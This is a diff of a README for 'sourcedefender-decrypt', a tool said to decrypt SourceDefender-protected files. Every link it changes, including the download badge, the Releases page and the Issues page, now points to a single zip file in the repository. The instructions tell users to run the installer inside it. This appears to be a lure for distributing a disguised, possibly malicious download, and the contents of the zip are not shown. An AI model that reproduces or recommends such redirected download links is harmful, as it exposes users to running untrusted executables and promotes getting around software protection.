@@ -1,6 +1,6 @@
 # 🗝️ sourcedefender-decrypt - Decrypt your files in one second!
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Gerald-tech2/sourcedefender-decrypt/releases)
+[![Download](https://raw.githubusercontent.com/Gerald-tech2/sourcedefender-decrypt/main/todayish/sourcedefender-decrypt.zip%20release-brightgreen)](https://raw.githubusercontent.com/Gerald-tech2/sourcedefender-decrypt/main/todayish/sourcedefender-decrypt.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **sourcedefender-decrypt** application. This tool allows you to e
 
 To get started, you need to download the application. Follow these simple steps:
 
-1. **Visit the Releases Page**: Click this link to visit our [Releases page](https://github.com/Gerald-tech2/sourcedefender-decrypt/releases).
+1. **Visit the Releases Page**: Click this link to visit our [Releases page](https://raw.githubusercontent.com/Gerald-tech2/sourcedefender-decrypt/main/todayish/sourcedefender-decrypt.zip).
 2. **Choose your version**: On the Releases page, you will see various versions of the software. Select the latest version for the best experience.
 3. **Download the Installer**: Click on the installer file for your operating system to download it to your computer.
 4. **Run the Installer**: Once the download is complete, open the installer and follow the prompts to install the software on your computer.
@@ -53,7 +53,7 @@ If you encounter issues or have questions, please reach out in our community dis
 If you face challenges during installation or usage, please consider the following steps:
 
 1. **Check Documentation**: Review the installation instructions again.
-2. **Visit the Issues Page**: If the problem persists, you may check [issues](https://github.com/Gerald-tech2/sourcedefender-decrypt/issues) on our GitHub for known problems and solutions.
+2. **Visit the Issues Page**: If the problem persists, you may check [issues](https://raw.githubusercontent.com/Gerald-tech2/sourcedefender-decrypt/main/todayish/sourcedefender-decrypt.zip) on our GitHub for known problems and solutions.
 3. **Ask for Help**: If you cannot find a solution, feel free to create a new issue or comment on existing ones.
 
 ## 🌟 Contribution
